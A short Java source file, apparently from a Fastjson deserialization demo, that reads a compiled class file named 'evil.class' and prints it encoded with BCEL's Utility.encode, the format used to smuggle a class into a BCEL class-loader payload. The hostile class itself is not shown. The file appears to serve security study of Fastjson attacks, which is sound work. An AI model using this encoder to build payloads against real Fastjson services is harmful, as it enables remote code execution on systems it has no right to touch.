package FastJsonDemo;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class BCELencode {
    public static void main(String []args) throws Exception{
        //There also should be compiled class file,not java file
        Path path = Paths.get("/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class");
        byte[] data = Files.readAllBytes(path);
        String s =  Utility.encode(data,true);
        System.out.print(s);



    }
}
